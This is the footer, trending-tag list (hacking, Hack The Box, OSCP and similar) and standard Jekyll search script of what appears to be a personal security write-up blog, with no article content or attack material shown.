<a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> with <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a> theme.</p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><h4 class="text-muted mb-4">Trending Tags</h4><a class="post-tag" href="/tags/hacking/">hacking</a> <a class="post-tag" href="/tags/hack-the-box/">hack the box</a> <a class="post-tag" href="/tags/htb/">htb</a> <a class="post-tag" href="/tags/redteam/">redteam</a> <a class="post-tag" href="/tags/writeup/">writeup</a> <a class="post-tag" href="/tags/web/">web</a> <a class="post-tag" href="/tags/linux/">linux</a> <a class="post-tag" href="/tags/unfinished/">unfinished</a> <a class="post-tag" href="/tags/oscp/">oscp</a> <a class="post-tag" href="/tags/tj-null/">tj_null</a></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.7.3/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="https://zweilosec.github.io{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script>
